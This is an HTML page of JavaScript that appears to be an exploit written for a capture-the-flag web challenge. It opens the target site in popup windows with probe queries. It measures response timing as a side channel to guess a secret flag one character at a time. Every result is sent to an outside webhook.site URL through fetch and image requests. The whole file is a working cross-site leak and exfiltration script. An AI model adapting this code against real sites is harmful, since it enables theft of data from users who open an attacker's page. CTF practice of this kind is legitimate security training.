<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
// v5 - pure diagnostic: test single chars to find what flag starts with
var T="https://svfgp.breakable.live";
var W="https://webhook.site/10a463c9-e597-4bed-930e-21ae49f6f588";
var PT=15000; // 15s timeout to ensure we catch PBKDF2 (3M iter ~5-8s)

function exfil(d){
  var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
  try{fetch(u,{mode:"no-cors",cache:"no-store"});}catch(e){}
  try{new Image().src=u+"&x=1";}catch(e){}
}

exfil("v5_LOADED");

function probe(q){
  return new Promise(function(res){
    var sid="s"+Date.now()+"-"+Math.random().toString(36).slice(2,8);
    var rid="r"+Math.random().toString(36).slice(2,8);
    var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
      "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
    var t0=Date.now();
    var wn="p_"+Math.random().toString(36).slice(2,8);
    var w;
    try{w=window.open(url,wn);}catch(e){res({q:q,t:0,src:"err"});return;}
    if(!w){res({q:q,t:0,src:"null"});return;}
    var done=false;
    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({q:q,t:ms,src:src});}
    function handler(e){
      if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
        window.removeEventListener("message",handler);
        fin(Date.now()-t0,"msg");
      }
    }
    window.addEventListener("message",handler);
    setTimeout(function(){window.removeEventListener("message",handler);fin(Date.now()-t0,"timeout");},PT);
  });
}

function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}

async function run(){
  exfil("v5_START");

  // Test 1: probe "C" - if flag is CTF{...}, "CTF{hash}".startsWith("C") = true -> PBKDF2 ~5s
  var r1=await probe("C");
  exfil("D1_C:"+r1.t+"ms("+r1.src+")");
  await sleep(300);

  // Test 2: probe "Z" - control, should never match -> fast
  var r2=await probe("Z");
  exfil("D2_Z:"+r2.t+"ms("+r2.src+")");
  await sleep(300);

  // If C triggered PBKDF2, flag starts with C (likely CTF{})
  if(r1.src==="msg" && r1.t>2500){
    exfil("FLAG_STARTS_C:confirmed");
    // Verify CTF{
    var r3=await probe("CTF{");
    exfil("D3_CTF:"+r3.t+"ms("+r3.src+")");
    if(r3.src==="msg" && r3.t>2500){
      exfil("PREFIX_CTF_CONFIRMED");
      // Now find first hex char after CTF{
      var hex="0123456789abcdef";
      for(var i=0;i<hex.length;i++){
        var ch=hex[i];
        var r=await probe("CTF{"+ch);
        exfil("CTF_"+ch+":"+r.t+"ms("+r.src+")");
        if(r.src==="msg"&&r.t>2500){
          exfil("FIRST_CHAR:"+ch);
          break;
        }
        await sleep(100);
      }
    }
  } else {
    // C didn't match - maybe raw SHA256 hash without CTF{ prefix
    exfil("C_NO_MATCH:testing_hex_chars");
    var hex="0123456789abcdef";
    var found="";
    for(var i=0;i<hex.length;i++){
      var ch=hex[i];
      var r=await probe(ch);
      exfil("H_"+ch+":"+r.t+"ms("+r.src+")");
      if(r.src==="msg"&&r.t>2500){
        exfil("RAW_FIRST:"+ch);
        found=ch;
        break;
      }
      await sleep(100);
    }
    if(!found){
      // No single hex char matched - try uppercase, ctf{, other prefixes
      exfil("NO_HEX_MATCH:trying_misc");
      var misc=["c","t","f","ctf{","CTF","flag","FLAG{","UNR{","unr{"];
      for(var i=0;i<misc.length;i++){
        var r=await probe(misc[i]);
        exfil("M_"+misc[i]+":"+r.t+"ms("+r.src+")");
        if(r.src==="msg"&&r.t>2500){
          exfil("MISC_HIT:"+misc[i]);
          break;
        }
        await sleep(100);
      }
    }
  }

  exfil("v5_DONE");
}

setTimeout(run,500);
</script></body></html>
